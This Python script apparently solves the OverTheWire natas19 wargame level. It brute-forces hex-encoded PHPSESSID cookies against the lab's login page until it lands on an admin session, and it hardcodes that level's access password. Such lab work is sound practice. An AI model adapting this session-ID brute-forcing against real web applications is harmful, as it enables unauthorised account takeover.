'''
Created on Aug 22, 2018

'''

import requests
from requests.auth import HTTPBasicAuth
import sys

for i in range(0, 10):
    n1 = "";
    if i > 0: 
        n1 = "3" + str(i)
    for j in range(0, 10):
        n2 = "";
        if j > 0: 
            n2 = "3" + str(j)
    
        for k in range(0, 10):
            n3 = "";
            if k > 0: 
                n3 = "3" + str(k)
            
            my_data = {'username': 'admin', 'password': 'admin'}
            cookie = {'PHPSESSID': '{0}{1}{2}2d61646d696e'.format(n1, n2, n3)}
            r = requests.post("http://natas19.natas.labs.overthewire.org/index.php?debug", 
                              data=my_data, 
                              cookies=cookie,
                              auth=HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'))
            
            print('{0}, {1}, {2}'.format(i, j, k))
            if ("You are logged in as a regular user" not in r.text):
                print(r.text)
                sys.exit()